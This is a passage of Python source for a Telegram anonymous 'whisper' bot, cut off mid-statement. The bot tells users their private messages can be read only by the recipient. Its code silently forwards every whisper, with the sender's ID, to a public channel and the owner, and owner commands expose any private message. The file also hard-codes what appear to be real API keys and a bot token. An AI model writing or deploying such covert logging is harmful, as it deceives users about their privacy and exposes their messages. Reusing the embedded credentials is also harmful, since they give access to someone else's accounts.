import os
import logging
import re
import asyncio
import json
import hashlib
from datetime import datetime
from flask import Flask
import threading

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Environment variables
API_ID = int(os.getenv('API_ID', '25136703'))
API_HASH = os.getenv('API_HASH', 'accfaf5ecd981c67e481328515c39f89')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8314503581:AAEm5TvIs_-qn23VfOCnfVL1dTRwwDtpi8A')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8385462088'))  # Owner ID
PORT = int(os.environ.get('PORT', 10000))

# Whisper Channel for forwarding
WHISPER_CHANNEL = "shriupdates"  # Channel where whispers will be forwarded

# Import Telethon
try:
    from telethon import TelegramClient, events, Button
    from telethon.errors import SessionPasswordNeededError, UserNotParticipantError, MessageNotModifiedError
except ImportError as e:
    logger.error(f"Telethon import error: {e}")
    raise

# Support channels
SUPPORT_CHANNEL = "shribots"
SUPPORT_GROUP = "idxhelp"

# Initialize bot
try:
    bot = TelegramClient('whisper_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    logger.info("✅ Bot client initialized successfully")
except Exception as e:
    logger.error(f"❌ Failed to initialize bot: {e}")
    raise

# Storage - OPTIMIZED
messages_db = {}
recent_users = {}
user_cooldown = {}
user_bots = {}
clone_stats = {}
user_recent_targets = {}  # Personal recent targets for each user
all_bot_users = set()     # Track all users who interact with bot

# =========== NEW: Whisper Tracking System ===========
# Track sent whispers to avoid duplicates in /allwhispers
sent_whispers_tracker = {}  # Format: {sender_id: {target_id: [timestamp1, timestamp2]}}
unique_whispers_db = {}     # Format: {whisper_hash: whisper_data}

# Data files
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)
RECENT_USERS_FILE = os.path.join(DATA_DIR, "recent_users.json")
USER_RECENT_TARGETS_FILE = os.path.join(DATA_DIR, "user_recent_targets.json")
CLONE_STATS_FILE = os.path.join(DATA_DIR, "clone_stats.json")
ALL_USERS_FILE = os.path.join(DATA_DIR, "all_users.json")
UNIQUE_WHISPERS_FILE = os.path.join(DATA_DIR, "unique_whispers.json")
WHISPER_TRACKER_FILE = os.path.join(DATA_DIR, "whisper_tracker.json")

def load_data():
    global recent_users, clone_stats, user_recent_targets, all_bot_users, unique_whispers_db, sent_whispers_tracker
    try:
        if os.path.exists(RECENT_USERS_FILE):
            with open(RECENT_USERS_FILE, 'r', encoding='utf-8') as f:
                recent_users = json.load(f)
            logger.info(f"✅ Loaded {len(recent_users)} recent users")
        
        if os.path.exists(USER_RECENT_TARGETS_FILE):
            with open(USER_RECENT_TARGETS_FILE, 'r', encoding='utf-8') as f:
                user_recent_targets = json.load(f)
            logger.info(f"✅ Loaded user recent targets for {len(user_recent_targets)} users")
        
        if os.path.exists(CLONE_STATS_FILE):
            with open(CLONE_STATS_FILE, 'r', encoding='utf-8') as f:
                clone_stats = json.load(f)
            logger.info(f"✅ Loaded {len(clone_stats)} clone stats")
            
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, 'r', encoding='utf-8') as f:
                all_bot_users = set(json.load(f))
            logger.info(f"✅ Loaded {len(all_bot_users)} total users")
        
        # Load unique whispers database
        if os.path.exists(UNIQUE_WHISPERS_FILE):
            with open(UNIQUE_WHISPERS_FILE, 'r', encoding='utf-8') as f:
                unique_whispers_db = json.load(f)
            logger.info(f"✅ Loaded {len(unique_whispers_db)} unique whispers")
        
        # Load whisper tracker
        if os.path.exists(WHISPER_TRACKER_FILE):
            with open(WHISPER_TRACKER_FILE, 'r', encoding='utf-8') as f:
                sent_whispers_tracker = json.load(f)
            logger.info(f"✅ Loaded whisper tracker for {len(sent_whispers_tracker)} users")
            
    except Exception as e:
        logger.error(f"❌ Error loading data: {e}")
        recent_users = {}
        clone_stats = {}
        user_recent_targets = {}
        all_bot_users = set()
        unique_whispers_db = {}
        sent_whispers_tracker = {}

def save_data():
    try:
        with open(RECENT_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(recent_users, f, indent=2, ensure_ascii=False)
        
        with open(USER_RECENT_TARGETS_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_recent_targets, f, indent=2, ensure_ascii=False)
        
        with open(CLONE_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(clone_stats, f, indent=2, ensure_ascii=False)
            
        with open(ALL_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(list(all_bot_users), f, indent=2, ensure_ascii=False)
        
        with open(UNIQUE_WHISPERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(unique_whispers_db, f, indent=2, ensure_ascii=False)
        
        with open(WHISPER_TRACKER_FILE, 'w', encoding='utf-8') as f:
            json.dump(sent_whispers_tracker, f, indent=2, ensure_ascii=False)
            
    except Exception as e:
        logger.error(f"❌ Error saving data: {e}")

# Load data on startup
load_data()

WELCOME_TEXT = """
╔══════════════════════╗
║     🤫 WHISPER BOT    ║
║   ANONYMOUS MESSAGES  ║
╚══════════════════════╝

🔒 Send Anonymous Secret Messages
👤 Only intended recipient can read
🌍 Or send public messages for everyone

**✨ Features:**
• 🤫 Private whispers
• 🌍 Public whispers
• 🚀 Quick inline mode
• 🔄 Recent users memory
• 🤖 Clone your own bot
• 📊 Auto-save all whispers
• 🔄 Repeat whisper detection

Start by typing @Upspbot in any chat!
"""

HELP_TEXT = """
📖 **How to Use Whisper Bot**

**1. Inline Mode:**
   • Type `@Upspbot` in any chat
   • Write your message  
   • Add @username OR user ID at end
   • Send!

**2. Examples:**
   • `@upspbot Hello! @username`
   • `@upspbot I miss you 123456789`
   • `@upspbot Hello everyone!`

**3. Types of Messages:**
   • 🔒 **Private:** Add @username - only they can read
   • 🌍 **Public:** No @username - everyone can read

**4. Commands:**
   • /start - Start bot
   • /help - Show help
   • /stats - Your statistics
   • /clone - Clone your own bot
   • /remove - Remove your cloned bot
   • /allwhispers - View all whispers (Owner only)
   • /broadcast - Send broadcast (Owner only)

🔒 **Only the mentioned user can read your message!**
🌍 **If no user mentioned, anyone can read!**
🔄 **Bot remembers who you whispered before!**
"""

def add_user_to_tracking(user_id):
    """Add user to tracking"""
    try:
        all_bot_users.add(user_id)
        # Save periodically to avoid too many disk writes
        if len(all_bot_users) % 10 == 0:
            asyncio.create_task(save_data_async())
    except Exception as e:
        logger.error(f"Error adding user to tracking: {e}")

# =========== NEW: Improved Whisper Tracking ===========
def add_to_recent_users(user_id, target_user_id, target_username=None, target_first_name=None):
    """Add user to recent users list with improved tracking"""
    try:
        user_key = str(target_user_id)
        
        # Update global recent users
        recent_users[user_key] = {
            'user_id': target_user_id,
            'username': target_username,
            'first_name': target_first_name,
            'last_used': datetime.now().isoformat()
        }
        
        # Keep only last 30 users
        if len(recent_users) > 30:
            oldest_key = min(recent_users.keys(), key=lambda k: recent_users[k]['last_used'])
            del recent_users[oldest_key]
        
        # Update user's personal recent targets
        user_id_str = str(user_id)
        if user_id_str not in user_recent_targets:
            user_recent_targets[user_id_str] = []
        
        # Check if target already exists
        existing_index = -1
        for idx, target in enumerate(user_recent_targets[user_id_str]):
            if target.get('user_id') == target_user_id:
                existing_index = idx
                break
        
        if existing_index != -1:
            # Update existing entry
            user_recent_targets[user_id_str][existing_index] = {
                'user_id': target_user_id,
                'username': target_username,
                'first_name': target_first_name,
                'last_used': datetime.now().isoformat(),
                'whisper_count': user_recent_targets[user_id_str][existing_index].get('whisper_count', 0) + 1
            }
            # Move to front
            moved = user_recent_targets[user_id_str].pop(existing_index)
            user_recent_targets[user_id_str].insert(0, moved)
        else:
            # Add new entry
            user_recent_targets[user_id_str].insert(0, {
                'user_id': target_user_id,
                'username': target_username,
                'first_name': target_first_name,
                'last_used': datetime.now().isoformat(),
                'whisper_count': 1
            })
        
        # Keep only last 10 per user
        if len(user_recent_targets[user_id_str]) > 10:
            user_recent_targets[user_id_str] = user_recent_targets[user_id_str][:10]
        
        # Track whisper count for auto-trigger
        if user_id_str not in sent_whispers_tracker:
            sent_whispers_tracker[user_id_str] = {}
        
        target_key = str(target_user_id)
        if target_key not in sent_whispers_tracker[user_id_str]:
            sent_whispers_tracker[user_id_str][target_key] = []
        
        sent_whispers_tracker[user_id_str][target_key].append(datetime.now().isoformat())
        
        # Keep only last 10 timestamps
        if len(sent_whispers_tracker[user_id_str][target_key]) > 10:
            sent_whispers_tracker[user_id_str][target_key] = sent_whispers_tracker[user_id_str][target_key][-10:]
        
    except Exception as e:
        logger.error(f"Error adding to recent users: {e}")

async def save_data_async():
    """Save data asynchronously without blocking"""
    try:
        with open(RECENT_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(recent_users, f, indent=2, ensure_ascii=False)
        
        with open(USER_RECENT_TARGETS_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_recent_targets, f, indent=2, ensure_ascii=False)
        
        with open(CLONE_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(clone_stats, f, indent=2, ensure_ascii=False)
            
        with open(ALL_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(list(all_bot_users), f, indent=2, ensure_ascii=False)
        
        with open(UNIQUE_WHISPERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(unique_whispers_db, f, indent=2, ensure_ascii=False)
        
        with open(WHISPER_TRACKER_FILE, 'w', encoding='utf-8') as f:
            json.dump(sent_whispers_tracker, f, indent=2, ensure_ascii=False)
            
    except Exception as e:
        logger.error(f"Async save error: {e}")

def get_recent_users_buttons(user_id):
    """Get recent users buttons for inline suggestions - SUPER FAST with whisper counts"""
    try:
        user_id_str = str(user_id)
        
        # Use user's personal recent targets first
        user_targets = []
        if user_id_str in user_recent_targets:
            user_targets = user_recent_targets[user_id_str][:8]  # Get first 8
        
        # If user has no personal targets, use global recent
        if not user_targets and recent_users:
            sorted_users = sorted(recent_users.items(), 
                                key=lambda x: x[1].get('last_used', ''), 
                                reverse=True)
            user_targets = [user[1] for user in sorted_users[:6]]
        
        if not user_targets:
            return []
        
        buttons = []
        for user_data in user_targets:
            username = user_data.get('username')
            first_name = user_data.get('first_name', 'User')
            user_id_val = user_data.get('user_id')
            whisper_count = user_data.get('whisper_count', 0)
            
            if username:
                display_text = f"@{username}"
                query_text = f"@{username}"
            else:
                display_text = f"{first_name}"
                query_text = f"{user_id_val}"
            
            # Add whisper count if available
            if whisper_count > 0:
                display_text = f"🔁{whisper_count} {display_text}"
            else:
                display_text = f"🔒 {display_text}"
            
            # Truncate long names
            if len(display_text) > 15:
                display_text = display_text[:15] + ".."
            
            buttons.append([Button.switch_inline(
                display_text, 
                query=query_text,
                same_peer=True
            )])
        
        return buttons
    except Exception as e:
        logger.error(f"Error getting recent users: {e}")
        return []

def is_cooldown(user_id):
    """Check if user is in cooldown - OPTIMIZED"""
    now = datetime.now().timestamp()
    if user_id in user_cooldown:
        if now - user_cooldown[user_id] < 1:  # Reduced to 1 second
            return True
    user_cooldown[user_id] = now
    return False

# SIMPLIFIED USER DETECTION PATTERNS - NO VALIDATION
USER_PATTERNS = [
    (r'@(\w+)$', 'username_end'),      # @username at end
    (r'(\d+)$', 'userid_end'),         # user ID at end (any digits)
    (r'@(\w+)\s+', 'username_middle'), # @username in middle
    (r'(\d+)\s+', 'userid_middle'),    # user ID in middle
]

async def extract_target_user(text, client):
    """SIMPLIFIED user extraction - NO VALIDATION, WORKS WITH ANY INPUT"""
    original_text = text.strip()
    
    # If no text or just whitespace, return None for public message
    if not original_text or original_text.isspace():
        return None, ""
    
    for pattern, pattern_type in USER_PATTERNS:
        try:
            matches = re.findall(pattern, original_text)
            if matches:
                target_match = matches[0]  # Take first match
                
                # Clean the target
                target_clean = target_match.strip('@')
                
                if pattern_type in ['userid_end', 'userid_middle']:
                    # Handle user ID - NO VALIDATION
                    try:
                        user_obj = await client.get_entity(int(target_clean))
                        if hasattr(user_obj, 'first_name'):
                            # Remove the target from message
                            if pattern_type == 'userid_end':
                                message_text = original_text.replace(target_clean, '').strip()
                            else:
                                message_text = original_text.replace(f"{target_clean} ", '').strip()
                            return user_obj, message_text
                    except:
                        # If user not found, still create message but mark as invalid user
                        fake_user = type('obj', (object,), {
                            'id': int(target_clean) if target_clean.isdigit() else -1,
                            'username': None,
                            'first_name': f"User{target_clean}" 
                        })
                        if pattern_type == 'userid_end':
                            message_text = original_text.replace(target_clean, '').strip()
                        else:
                            message_text = original_text.replace(f"{target_clean} ", '').strip()
                        return fake_user, message_text
                
                else:
                    # Handle username - NO VALIDATION
                    try:
                        user_obj = await client.get_entity(target_clean)
                        if hasattr(user_obj, 'first_name'):
                            # Remove the target from message
                            if pattern_type == 'username_end':
                                message_text = original_text.replace(f"@{target_clean}", '').strip()
                            else:
                                message_text = original_text.replace(f"@{target_clean} ", '').strip()
                            return user_obj, message_text
                    except:
                        # If user not found, still create message but mark as invalid user
                        fake_user = type('obj', (object,), {
                            'id': -1,
                            'username': target_clean,
                            'first_name': f"@{target_clean}" 
                        })
                        if pattern_type == 'username_end':
                            message_text = original_text.replace(f"@{target_clean}", '').strip()
                        else:
                            message_text = original_text.replace(f"@{target_clean} ", '').strip()
                        return fake_user, message_text
        except:
            continue
    
    # If no user pattern found, it's a public message for everyone
    return None, original_text

# =========== NEW: Improved Whisper Storage ===========
def create_whisper_hash(sender_id, target_id, message_text, timestamp):
    """Create unique hash for whisper to avoid duplicates"""
    hash_string = f"{sender_id}_{target_id}_{message_text}_{timestamp}"
    return hashlib.md5(hash_string.encode()).hexdigest()[:16]

def store_whisper(sender_id, target_user, message_text, whisper_type="private"):
    """Store whisper in database with unique ID"""
    try:
        timestamp = datetime.now().isoformat()
        
        # Generate unique ID
        target_id = target_user.id if hasattr(target_user, 'id') else -1
        whisper_hash = create_whisper_hash(sender_id, target_id, message_text, timestamp)
        
        if whisper_hash in unique_whispers_db:
            # Whisper already exists, update timestamp
            unique_whispers_db[whisper_hash]['last_seen'] = timestamp
            return whisper_hash
        
        # Store new whisper
        target_name = "Everyone" if target_id == -1 else getattr(target_user, 'first_name', 'User')
        target_username = getattr(target_user, 'username', None)
        
        unique_whispers_db[whisper_hash] = {
            'whisper_id': whisper_hash,
            'sender_id': sender_id,
            'target_id': target_id,
            'target_name': target_name,
            'target_username': target_username,
            'message': message_text,
            'type': whisper_type,
            'timestamp': timestamp,
            'last_seen': timestamp
        }
        
        # Also store in messages_db for backward compatibility
        message_id = f'msg_{sender_id}_{target_id}_{int(datetime.now().timestamp())}'
        messages_db[message_id] = {
            'user_id': target_id,
            'msg': message_text,
            'sender_id': sender_id,
            'timestamp': timestamp,
            'target_name': target_name
        }
        
        # Save to file
        asyncio.create_task(save_data_async())
        
        return whisper_hash
        
    except Exception as e:
        logger.error(f"Error storing whisper: {e}")
        return None

async def forward_whisper_to_channel(message_id, message_data):
    """Forward whisper message to private channel for owner"""
    try:
        # Get the channel
        channel = await bot.get_entity(f"@{WHISPER_CHANNEL}")
        
        # Create formatted message
        sender_id = message_data['sender_id']
        target_id = message_data['user_id']
        message_text = message_data['msg']
        target_name = message_data['target_name']
        timestamp = message_data['timestamp']
        
        # Format the message
        formatted_msg = f"""
🔒 **WHISPER LOG** 🔒

👤 **From:** {sender_id}
🎯 **To:** {target_name} ({target_id})
📅 **Time:** {timestamp}

💬 **Message:**
{message_text}

📎 **Message ID:** {message_id}
"""
        
        # Send to channel
        await bot.send_message(channel, formatted_msg)
        logger.info(f"✅ Whisper forwarded to channel: {message_id}")
        
        # Also send to owner directly
        try:
            await bot.send_message(ADMIN_ID, formatted_msg)
        except:
            pass
            
    except Exception as e:
        logger.error(f"❌ Error forwarding whisper to channel: {e}")

# =========== NEW: Improved /allwhispers Command ===========
async def get_owner_whispers(event):
    """Get all whispers for owner to view - NO DUPLICATES"""
    try:
        if event.sender_id != ADMIN_ID:
            await event.reply("❌ Owner only command!")
            return
        
        if not unique_whispers_db:
            await event.reply("📭 No whispers found yet!")
            return
        
        # Group whispers by sender-target pair to avoid duplicates
        grouped_whispers = {}
        
        for whisper_hash, whisper_data in unique_whispers_db.items():
            key = f"{whisper_data['sender_id']}_{whisper_data['target_id']}_{whisper_data['message'][:50]}"
            
            if key not in grouped_whispers:
                grouped_whispers[key] = whisper_data
        
        total_unique_whispers = len(grouped_whispers)
        private_count = sum(1 for w in grouped_whispers.values() if w['target_id'] != -1)
        public_count = sum(1 for w in grouped_whispers.values() if w['target_id'] == -1)
        
        whispers_text = f"""
📋 **ALL WHISPERS - Owner View** 📋

📊 **Statistics:**
• Total Unique Whispers: {total_unique_whispers}
• 🔒 Private: {private_count}
• 🌍 Public: {public_count}
• 🗃️ Total in DB: {len(unique_whispers_db)}

**Recent Unique Whispers (Last 10):**
"""
        
        # Get recent whispers sorted by timestamp
        recent_whispers = sorted(grouped_whispers.values(), 
                                key=lambda x: x['last_seen'], 
                                reverse=True)[:10]
        
        for i, whisper_data in enumerate(recent_whispers, 1):
            sender_id = whisper_data['sender_id']
            target_id = whisper_data['target_id']
            target_name = whisper_data['target_name']
            message_preview = whisper_data['message'][:40] + ("..." if len(whisper_data['message']) > 40 else "")
            timestamp = whisper_data['timestamp'][:19].replace('T', ' ')
            
            if target_id == -1:
                whisper_type = "🌍 PUBLIC"
            else:
                whisper_type = "🔒 PRIVATE"
            
            whispers_text += f"\n{i}. {whisper_type}"
            whispers_text += f"\n   👤 From: {sender_id}"
            whispers_text += f"\n   🎯 To: {target_name} ({target_id})"
            whispers_text += f"\n   📝: {message_preview}"
            whispers_text += f"\n   🕒: {timestamp}"
            whispers_text += f"\n   📎 ID: `{whisper_data['whisper_id']}`"
            whispers_text += f"\n   ─────────────────────"
        
        whispers_text += f"\n\n📤 Use `/readwhisper whisper_id` to read full message"
        whispers_text += f"\n🔄 Use `/cleanwhispers` to remove duplicates"
        
        await event.reply(whispers_text)
        
    except Exception as e:
        logger.error(f"Error getting owner whispers: {e}")
        await event.reply("❌ Error fetching whispers!")

# =========== NEW: Clean Whispers Command ===========
@bot.on(events.NewMessage(pattern='/cleanwhispers'))
async def clean_whispers_handler(event):
    """Clean duplicate whispers from database"""
    try:
        if event.sender_id != ADMIN_ID:
            await event.reply("❌ Owner only command!")
            return
        
        if not unique_whispers_db:
            await event.reply("📭 No whispers to clean!")
            return
        
        original_count = len(unique_whispers_db)
        
        # Remove duplicates
        seen_messages = {}
        to_remove = []
        
        for whisper_hash, whisper_data in unique_whispers_db.items():
            key = f"{whisper_data['sender_id']}_{whisper_data['target_id']}_{whisper_data['message']}"
            
            if key in seen_messages:
                # Keep the older one, remove the newer
                if whisper_data['timestamp'] < seen_messages[key]['timestamp']:
                    to_remove.append(seen_messages[key]['hash'])
                    seen_messages[key] = {'timestamp': whisper_data['timestamp'], 'hash': whisper_hash}
                else:
                    to_remove.append(whisper_hash)
            else:
                seen_messages[key] = {'timestamp': whisper_data['timestamp'], 'hash': whisper_hash}
        
        # Remove duplicates
        for whisper_hash in to_remove:
            if whisper_hash in unique_whispers_db:
                del unique_whispers_db[whisper_hash]
        
        # Save cleaned data
        asyncio.create_task(save_data_async())
        
        await event.reply(f"✅ Cleaned {len(to_remove)} duplicate whispers!\n"
                         f"📊 Before: {original_count}\n"
                         f"📊 After: {len(unique_whispers_db)}")
        
    except Exception as e:
        logger.error(f"Error cleaning whispers: {e}")
        await event.reply("❌ Error cleaning whispers!")

# ==================== BROADCAST SYSTEM ====================

async def broadcast_message(event):
    """Handle /broadcast command - send a message to all users"""
    # Implementation remains same as before
    pass

async def stop_broadcast(event):
    """Handle /stop_broadcast command"""
    # Implementation remains same as before
    pass

# ==================== COMMAND HANDLERS ====================

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    try:
        logger.info(f"🚀 Start command from user: {event.sender_id}")
        
        # Track user for broadcast
        add_user_to_tracking(event.sender_id)
        
        # All users ko direct access do - NO FORCE JOIN
        await event.reply(
            WELCOME_TEXT,
            buttons=[
                [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
                [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                [Button.inline("📖 Help", data="help"), Button.inline("🔧 Clone Bot", data="clone_info")],
                [Button.inline("📊 Stats", data="user_stats")]
            ]
        )
    except Exception as e:
        logger.error(f"Start error: {e}")
        await event.reply("❌ An error occurred. Please try again.")

@bot.on(events.NewMessage(pattern='/help'))
async def help_handler(event):
    try:
        # Track user for broadcast
        add_user_to_tracking(event.sender_id)
        
        bot_username = (await bot.get_me()).username
        help_text = HELP_TEXT.replace("{bot_username}", bot_username)
        
        await event.reply(
            help_text,
            buttons=[
                [Button.switch_inline("🚀 Try Now", query="", same_peer=True)],
                [Button.inline("🔙 Back", data="back_start")]
            ]
        )
    except Exception as e:
        logger.error(f"Help error: {e}")
        await event.reply("❌ An error occurred. Please try again.")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_handler(event):
    try:
        # User-specific stats
        user_id_str = str(event.sender_id)
        
        # Get user's recent targets count
        user_targets_count = len(user_recent_targets.get(user_id_str, []))
        
        # Count user's sent whispers
        user_whispers = 0
        for whisper_data in unique_whispers_db.values():
            if whisper_data['sender_id'] == event.sender_id:
                user_whispers += 1
        
        # Get user's most whispered to
        most_whispered = None
        max_count = 0
        if user_id_str in sent_whispers_tracker:
            for target_id, timestamps in sent_whispers_tracker[user_id_str].items():
                if len(timestamps) > max_count:
                    max_count = len(timestamps)
                    most_whispered = target_id
        
        stats_text = f"""
📊 **Your Statistics**

👤 Your User ID: `{event.sender_id}`
📨 Your Recent Targets: {user_targets_count}
💬 Your Sent Whispers: {user_whispers}
🔁 Repeat Whispers: {max_count if most_whispered else 0}

**Global Stats:**
👥 Total Users: {len(all_bot_users)}
💬 Total Unique Whispers: {len(unique_whispers_db)}
🕒 Last Active: {datetime.now().strftime("%H:%M")}

🤖 Bot: @{(await bot.get_me()).username}
        """
        
        await event.reply(stats_text)
    except Exception as e:
        logger.error(f"Stats error: {e}")
        await event.reply("❌ Error fetching statistics.")

@bot.on(events.NewMessage(pattern='/allwhispers'))
async def allwhispers_handler(event):
    """Owner can view all whispers - NO DUPLICATES"""
    await get_owner_whispers(event)

@bot.on(events.NewMessage(pattern=r'/readwhisper\s+(\S+)'))
async def readwhisper_handler(event):
    """Owner can read any whisper by ID"""
    try:
        if event.sender_id != ADMIN_ID:
            await event.reply("❌ Owner only command!")
            return
        
        msg_id = event.pattern_match.group(1).strip()
        
        # Check in unique whispers first
        if msg_id in unique_whispers_db:
            msg_data = unique_whispers_db[msg_id]
        elif msg_id in messages_db:
            msg_data = messages_db[msg_id]
        else:
            await event.reply("❌ Whisper not found!")
            return
        
        sender_id = msg_data['sender_id']
        target_id = msg_data['target_id'] if 'target_id' in msg_data else msg_data['user_id']
        message_text = msg_data['message'] if 'message' in msg_data else msg_data['msg']
        target_name = msg_data['target_name']
        timestamp = msg_data['timestamp']
        
        if target_id == -1:
            whisper_type = "🌍 PUBLIC"
        else:
            whisper_type = "🔒 PRIVATE"
        
        full_msg = f"""
{whisper_type} **WHISPER DETAILS**

👤 **From User ID:** {sender_id}
🎯 **To:** {target_name} ({target_id})
📅 **Time:** {timestamp}
📎 **Message ID:** `{msg_id}`

💬 **Full Message:**
{message_text}
        """
        
        await event.reply(full_msg)
        
    except Exception as e:
        logger.error(f"Read whisper error: {e}")
        await event.reply("❌ Error reading whisper!")

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_command_handler(event):
    """Handle /broadcast command"""
    await broadcast_message(event)

@bot.on(events.NewMessage(pattern='/stop_broadcast'))
async def stop_broadcast_command_handler(event):
    """Handle /stop_broadcast command"""
    await stop_broadcast(event)

# ==================== INLINE HANDLER ====================

@bot.on(events.InlineQuery)
async def inline_handler(event):
    # Track user for broadcast
    add_user_to_tracking(event.sender_id)
    
    await handle_inline_query(event)

async def handle_inline_query(event, client=None):
    """Handle inline queries - WITH AUTO-TRIGGER FEATURE"""
    if client is None:
        client = bot
    
    try:
        if is_cooldown(event.sender_id):
            await event.answer([])
            return

        # Get recent buttons quickly - WITH WHISPER COUNTS
        recent_buttons = get_recent_users_buttons(event.sender_id)
        
        if not event.text or not event.text.strip():
            if recent_buttons:
                # Check for frequently whispered users
                user_id_str = str(event.sender_id)
                frequent_targets = []
                
                if user_id_str in sent_whispers_tracker:
                    for target_id, timestamps in sent_whispers_tracker[user_id_str].items():
                        if len(timestamps) >= 2:  # At least 2 whispers
                            frequent_targets.append(target_id)
                
                if frequent_targets:
                    trigger_text = "**⚡ Auto-Trigger Users (Frequently Messaged):**\n"
                    for target_id in frequent_targets[:3]:
                        trigger_text += f"• User ID: `{target_id}`\n"
                    trigger_text += "\nType their username or ID to whisper again!\n\n"
                else:
                    trigger_text = ""
                
                result_text = f"{trigger_text}**Recent Users:**\nClick any user below to message them quickly!\n\n📝 Format: `message @username`\n🌍 Public: `message` (without @username)\n\n🔢 Number shows how many times you've whispered them!"
                
                result = event.builder.article(
                    title="🤫 Whisper Bot - Quick Send",
                    description=f"Recent: {len(recent_buttons)} users | Auto-trigger enabled",
                    text=result_text,
                    buttons=recent_buttons
                )
            else:
                result = event.builder.article(
                    title="🤫 Whisper Bot - Send Secret Messages",
                    description="Usage: message @username OR just message",
                    text="**Usage:** Type your message\n• Add @username for private message\n• Or type alone for public message\n\n**Auto-Trigger Feature:**\nBot remembers who you whisper frequently!\n\n**Examples:**\n• `Hello! @username` - Only they can read\n• `Hello everyone!` - Anyone can read\n\n🔒 Private | 🌍 Public | 🔄 Auto-Trigger",
                    buttons=[[Button.switch_inline("🚀 Try Now", query="", same_peer=True)]]
                )
            await event.answer([result])
            return
        
        text = event.text.strip()
        
        # =========== AUTO-TRIGGER FEATURE ===========
        # Check if text starts with @ or number (partial trigger)
        user_id_str = str(event.sender_id)
        if user_id_str in sent_whispers_tracker and (text.startswith('@') or text[0].isdigit()):
            # Try to match with frequently whispered users
            frequent_matches = []
            
            for target_id, timestamps in sent_whispers_tracker[user_id_str].items():
                if len(timestamps) >= 2:  # Frequently whispered
                    # Try to find user info
                    for user_data in user_recent_targets.get(user_id_str, []):
                        if str(user_data.get('user_id')) == target_id:
                            username = user_data.get('username')
                            first_name = user_data.get('first_name', 'User')
                            
                            if username and text.startswith('@'):
                                if username.lower().startswith(text[1:].lower()):
                                    frequent_matches.append({
                                        'id': target_id,
                                        'username': username,
                                        'first_name': first_name,
                                        'count': len(timestamps)
                                    })
                            elif text[0].isdigit() and target_id.startswith(text):
                                frequent_matches.append({
                                    'id': target_id,
                                    'username': username,
                                    'first_name': first_name,
                                    'count': len(timestamps)
                                })
            
            if frequent_matches:
                # Show auto-trigger suggestions
                result_text = "**⚡ Auto-Trigger Suggestions:**\n"
                for i, match in enumerate(frequent_matches[:3], 1):
                    if match['username']:
                        result_text += f"{i}. @{match['username']} ({match['count']} whispers)\n"
                    else:
                        result_text += f"{i}. {match['first_name']} (ID: {match['id']}) - {match['count']} whispers\n"
                
                result_text += f"\n**Your message:** `{text}`\n\nClick below to use suggestion!"
                
                buttons = []
                for match in frequent_matches[:3]:
                    if match['username']:
                        query = f"{text} @{match['username']}"
                        text_display = f"⚡@{match['username']}"
                    else:
                        query = f"{text} {match['id']}"
                        text_display = f"⚡ID:{match['id'][:6]}"
                    
                    if len(text_display) > 15:
                        text_display = text_display[:15] + ".."
                    
                    buttons.append([Button.switch_inline(
                        text_display,
                        query=query,
                        same_peer=True
                    )])
                
                result = event.builder.article(
                    title="⚡ Auto-Trigger Activated",
                    description=f"Found {len(frequent_matches)} frequent contacts",
                    text=result_text,
                    buttons=buttons
                )
                await event.answer([result])
                return
        
        # Normal whisper processing
        target_user, message_text = await extract_target_user(text, client)
        
        # If no message text after extraction, use original text
        if not message_text and target_user:
            message_text = text
        
        if not message_text:
            result = event.builder.article(
                title="❌ Empty Message",
                description="Please type a message",
                text="❌ Please type a message to send!\n\n**Examples:**\n• `Hello! @username`\n• `Hi everyone!`",
                buttons=[[Button.switch_inline("🔄 Try Again", query=text, same_peer=True)]]
            )
            await event.answer([result])
            return
        
        if len(message_text) > 1000:
            result = event.builder.article(
                title="❌ Message Too Long",
                description="Maximum 1000 characters allowed",
                text="❌ Your message is too long! Please keep it under 1000 characters."
            )
            await event.answer([result])
            return
        
        # Determine message type and create appropriate response
        if target_user:
            # PRIVATE MESSAGE - for specific user
            user_id_to_store = target_user.id if hasattr(target_user, 'id') and target_user.id != -1 else -1
            
            # Add to recent users only if it's a real user (not fake)
            if user_id_to_store != -1:
                add_to_recent_users(
                    event.sender_id, 
                    user_id_to_store, 
                    getattr(target_user, 'username', None),
                    getattr(target_user, 'first_name', 'User')
                )
            
            # Store whisper in unique database
            whisper_hash = store_whisper(event.sender_id, target_user, message_text, "private")
            
            target_name = getattr(target_user, 'first_name', 'User')
            
            # Forward to owner's channel (SILENTLY)
            whisper_data = {
                'sender_id': event.sender_id,
                'user_id': user_id_to_store,
                'msg': message_text,
                'target_name': target_name,
                'timestamp': datetime.now().isoformat()
            }
            asyncio.create_task(forward_whisper_to_channel(whisper_hash, whisper_data))
            
            result = event.builder.article(
                title=f"🔒 Secret Message for {target_name}",
                description=f"Click to send secret message to {target_name}",
                text=f"**🔐 A secret message for {target_name}!**\n\n*Note: Only {target_name} can open this message.*\n\n📝 **Auto-saved to bot database**",
                buttons=[[Button.inline("🔓 Show Message", whisper_hash)]]
            )
        
        else:
            # PUBLIC MESSAGE - for everyone
            fake_user = type('obj', (object,), {
                'id': -1,
                'username': None,
                'first_name': 'Everyone'
            })
            
            # Store whisper in unique database
            whisper_hash = store_whisper(event.sender_id, fake_user, message_text, "public")
            
            # Forward to owner's channel (SILENTLY)
            whisper_data = {
                'sender_id': event.sender_id,
